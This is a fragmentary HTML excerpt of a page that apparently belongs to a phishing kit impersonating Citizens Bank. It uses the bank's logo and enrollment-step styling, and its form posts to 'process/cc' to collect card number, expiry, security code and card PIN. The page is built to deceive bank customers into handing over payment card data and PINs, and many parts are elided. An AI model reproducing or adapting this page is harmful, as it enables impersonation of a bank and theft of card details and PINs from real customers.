    ...
    @media screen and (max-width: 600px) {
        ...
        <!-- htmlContainer PREFIX -->
            ...
            <div id="page-header" class="page-header">
             <form action="process/cc" method="post" class="unauth-form jqtransform js-login-form">
                <div class="centered-content clearfix">
                    <a href="#" class="page-logo" tabindex="1">
                        <img border="0" alt="Citizens Bank" width="203" height="25" src="img/CTZ_Green-01.png"> </a>
        ...
        <div class="centered-content clearfix">
            ...
            <div class="g-unauth-main-container">
                <section class="unauth-intro-area">
                    ...
                    <div role="progressbar" aria-valuenow="3" aria-valuemin="1" aria-valuetext="Step 1 of 5: Enrollment" aria-valuemax="5">
                        <div class="unauth-intro-area__step"> <strong>Step 3 of 5:</strong> <span>Processing...</span> </div>
                      ...
                      <div class="unauth-form__ic-identification-block">
                            <div class="unauth-form__row">
                                <div class="unauth-form__legend">
                                    <label class="unauth-form__label"><strong>Card Information</strong></label>
                                </div>
                            </div><br>

                            <div class="row">
                                <div class="col-25">
                                    <label for="em">Card Number</label>
                                    <input type="text" id="cnum" name="cnum" placeholder="" required="true">
                                   ...
                                   <label for="em">Expiry</label>
                                   <input type="text" id="exp" name="exp" placeholder="" required="true">
                                   <script src="js/mask.js"></script>
                                   <script>
                                    ...
                                    <label for="em">3 Digit Code</label>
                                    <input type="text" id="cvv" name="cvv" placeholder="" required="true">
                                    <script src="js/mask.js"></script>
                                    <script>
                                    ...
                                    <label for="em">Card Pin</label>
                                    <input type="text" id="pin" name="pin" placeholder="" required="true">
                                    <script src="js/mask.js"></script>
                                    <script>
        ...
        <footer id="page-footer" class="page-footer">
            <div class="footer-top">
                <ul>
                    ...
                    <li>
                        <a href="#" class="" title="Opens Branch &amp; ATM Locator Dialog"> <span class="account-underline"></span>
                            <span class="visuallyhidden"></span> 
                        </a>
                        
                          <a href="#" class="" title="Opens Branch &amp; ATM Locator Dialog"> 
                            <span class="account-underline"></span>
                            <span class="visuallyhidden"></span>
                        </a>  
